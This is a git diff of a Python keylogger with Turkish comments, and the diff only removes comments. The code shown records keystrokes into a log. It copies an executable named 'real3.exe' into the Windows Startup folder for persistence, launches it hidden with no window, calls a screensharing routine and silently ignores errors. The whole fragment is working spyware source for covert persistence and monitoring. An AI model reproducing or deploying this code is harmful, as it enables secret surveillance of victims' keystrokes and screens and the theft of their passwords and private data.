@@ -24,9 +24,9 @@ def callback_function(key):
         if key == key.space:
             log = log + " "
         elif key == key.tab:
-            log = log + 'tab'  # Sekme tuşuna basıldıysa, log değişkenine 'tab' ekler
+            log = log + 'tab' 
         elif key == key.backspace:
-            log += 'silme'  # Geri tuşuna basıldıysa, log değişkenine 'silme' ekler
+            log += 'silme' 
         elif key == key.enter:
             log += 'enter'  
         elif key == key.ctrl_l:
@@ -73,27 +73,27 @@ def thread_function():
 
 def copy_to_startup():
     try:
-        # Başlangıç klasörünü belirle
+      
         startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
 
-        # Kopyalanacak dosyanın adını ve kaynak yolunu belirle
+     
         source_filename = 'real3.exe'
         source_path = os.path.abspath(source_filename)
 
         # Hedef yol oluştur
         destination = os.path.join(startup_folder, source_filename)
 
-        # Dosyayı başlangıç klasörüne kopyala
+
         shutil.copyfile(source_path, destination)
 
-        # Dosyayı çalıştır
+     
         subprocess.Popen(destination, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
         screensharing()
-        # print(f"{source_filename} başarıyla başlangıç klasörüne kopyalandı ve çalıştırıldı.")
+     
 
     except Exception as e:
         pass
-        # print(f"Hata oluştu: {str(e)}")
+
     
 
 
